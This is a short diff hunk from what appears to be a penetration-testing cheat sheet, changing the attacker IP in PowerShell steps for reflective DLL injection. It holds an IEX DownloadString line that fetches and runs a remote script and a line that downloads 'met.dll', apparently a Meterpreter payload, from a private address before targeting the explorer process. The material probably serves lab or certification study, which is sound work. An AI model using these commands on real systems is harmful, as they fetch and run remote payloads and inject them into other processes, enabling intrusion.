@@ -28,7 +28,7 @@ IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.198/Invok
 3. Load the DLL (or .exe) into a byte array and retrieve the `explorer` process ID.
   (**NOTE:** _change the process based on your target environment_):
 ```powershell
-$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.191/met.dll')
+$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.198/met.dll')
 $procid = (Get-Process -Name explorer).Id
 ```
 
